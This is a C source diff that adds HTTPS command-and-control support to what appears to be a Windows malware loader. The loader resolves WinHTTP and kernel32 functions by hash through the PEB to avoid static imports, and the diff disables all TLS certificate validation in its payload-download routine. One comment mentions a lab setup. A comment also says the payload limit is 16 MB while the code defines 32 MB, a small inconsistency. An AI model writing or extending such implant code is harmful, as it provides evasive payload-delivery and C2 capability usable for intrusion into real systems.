@@ -30,6 +30,25 @@
 #include <stdlib.h>
 #include <string.h>
 
+/* R5 (HTTPS C2): WinHTTP cert-ignore constants. Guarded in case mingw's
+ * winhttp.h is missing them on any toolchain we build with. Values are
+ * stable Windows SDK constants. */
+#ifndef WINHTTP_OPTION_SECURITY_FLAGS
+#define WINHTTP_OPTION_SECURITY_FLAGS 31
+#endif
+#ifndef SECURITY_FLAG_IGNORE_UNKNOWN_CA
+#define SECURITY_FLAG_IGNORE_UNKNOWN_CA 0x00000100
+#endif
+#ifndef SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
+#endif
+#ifndef SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID 0x00001000
+#endif
+#ifndef SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
+#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE 0x00000200
+#endif
+
 /* Maximum payload size — 16 MB */
 #define MAX_PAYLOAD_SIZE (32 * 1024 * 1024)
 
@@ -45,6 +64,7 @@
 #define H_WinHttpReadData           0x7195E4E9u
 #define H_WinHttpCloseHandle        0x36220CD5u
 #define H_WinHttpCrackUrl           0x8272988Au
+#define H_WinHttpSetOption          0xA18B94F8u
 /* kernel32 exports — match peb.h */
 #define H_GetTickCount             0x41AD16B9u
 #define H_MultiByteToWideChar       0xE2FDDA8Eu
@@ -63,6 +83,7 @@ typedef WINBOOL   (WINAPI *pfnWinHttpReceiveResponse)(HINTERNET, LPVOID);
 typedef WINBOOL   (WINAPI *pfnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
 typedef WINBOOL   (WINAPI *pfnWinHttpCloseHandle)(HINTERNET);
 typedef WINBOOL   (WINAPI *pfnWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
+typedef WINBOOL   (WINAPI *pfnWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
 
 /* kernel32 function-pointer typedefs */
 typedef DWORD     (WINAPI *pfnGetTickCount)(VOID);
@@ -163,6 +184,7 @@ typedef struct {
     pfnWinHttpReadData       WinHttpReadData;
     pfnWinHttpCloseHandle    WinHttpCloseHandle;
     pfnWinHttpCrackUrl       WinHttpCrackUrl;
+    pfnWinHttpSetOption      WinHttpSetOption;
     /* kernel32 exports (resolved by hash, no static imports) */
     pfnGetTickCount          GetTickCount;
     pfnMultiByteToWideChar    MultiByteToWideChar;
@@ -195,10 +217,12 @@ static int resolve_apis(api_table *ap)
     ap->WinHttpReadData       = (pfnWinHttpReadData)       peb_find_export(ap->wh_base, H_WinHttpReadData);
     ap->WinHttpCloseHandle    = (pfnWinHttpCloseHandle)    peb_find_export(ap->wh_base, H_WinHttpCloseHandle);
     ap->WinHttpCrackUrl       = (pfnWinHttpCrackUrl)       peb_find_export(ap->wh_base, H_WinHttpCrackUrl);
+    ap->WinHttpSetOption      = (pfnWinHttpSetOption)      peb_find_export(ap->wh_base, H_WinHttpSetOption);
 
     if (!ap->WinHttpOpen || !ap->WinHttpConnect || !ap->WinHttpOpenRequest ||
         !ap->WinHttpSendRequest || !ap->WinHttpReceiveResponse ||
-        !ap->WinHttpReadData || !ap->WinHttpCloseHandle || !ap->WinHttpCrackUrl)
+        !ap->WinHttpReadData || !ap->WinHttpCloseHandle || !ap->WinHttpCrackUrl ||
+        !ap->WinHttpSetOption)
         return 0;
 
     return 1;
@@ -322,6 +346,24 @@ BOOL http_download(const char *url, uint8_t **out_data, size_t *out_len)
     if (!hRequest) {
         DBG_PRINTF("[http] WinHttpOpenRequest failed: %lu\n", GetLastError());
         goto cleanup;
+    }
+
+    /* R5 (HTTPS C2): self-signed cert bypass for lab TLS. WinHTTP would
+     * otherwise reject the server cert on CN / CA / date / usage mismatch.
+     * Only issued when the request is HTTPS — plain-HTTP skips. Failure here
+     * is non-fatal: if cert validation then actually rejects, WinHttpSendRequest
+     * returns a distinct ERROR_WINHTTP_SECURE_FAILURE so the operator can
+     * tell this apart from a connectivity miss. */
+    if (flags & WINHTTP_FLAG_SECURE) {
+        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
+                        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+                        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+                        | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+        if (!ap.WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
+                                 &secFlags, sizeof(secFlags))) {
+            DBG_PRINTF("[http] WinHttpSetOption(SECURITY_FLAGS) failed: %lu\n",
+                       GetLastError());
+        }
     }
 
     if (!ap.WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
